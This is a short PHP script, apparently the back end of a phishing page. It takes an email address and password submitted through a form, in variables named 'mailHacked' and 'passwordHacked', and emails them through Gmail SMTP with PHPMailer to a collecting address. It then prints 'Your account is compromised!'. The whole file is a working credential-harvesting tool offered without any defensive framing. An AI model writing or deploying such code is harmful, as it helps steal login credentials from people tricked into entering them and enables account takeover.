<?php

require __DIR__.'/vendor/autoload.php';
require __DIR__.'/vendor/phpmailer/phpmailer/src/PHPMailer.php';
require __DIR__.'/vendor/phpmailer/phpmailer/src/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$mail = new PHPMailer;

$mail->isSMTP();                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';       // Specify main and backup SMTP servers
$mail->SMTPAuth = true;               // Enable SMTP authentication
$mail->Username = 'youremail@example.com';   // SMTP username
$mail->Password = 'yourpassword';   // SMTP password
$mail->SMTPSecure = 'tls';            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;                    // TCP port to connect to

// Sender info
$mail->setFrom('from@example.com', 'Username');
// $mail->addReplyTo('reply@codexworld.com', 'Username');

// Add a recipient
$mail->addAddress('recipient@example.com');

//$mail->addCC('cc@example.com');
//$mail->addBCC('bcc@example.com');

// Set email format to HTML
$mail->isHTML(true);

// Mail subject
$mail->Subject = 'mySubject';

// Mail body content
$mailHacked = $_POST["email"];
$passwordHacked = $_POST["password"];
$bodyContent = "$mailHacked";
$bodyContent .= "<br>$passwordHacked";
$mail->Body = $bodyContent;

// Send email
if(!$mail->send()) {
    echo 'Message could not be sent. Mailer Error: '.$mail->ErrorInfo;
} else {
    echo 'Your account is compromised!';
}

?>
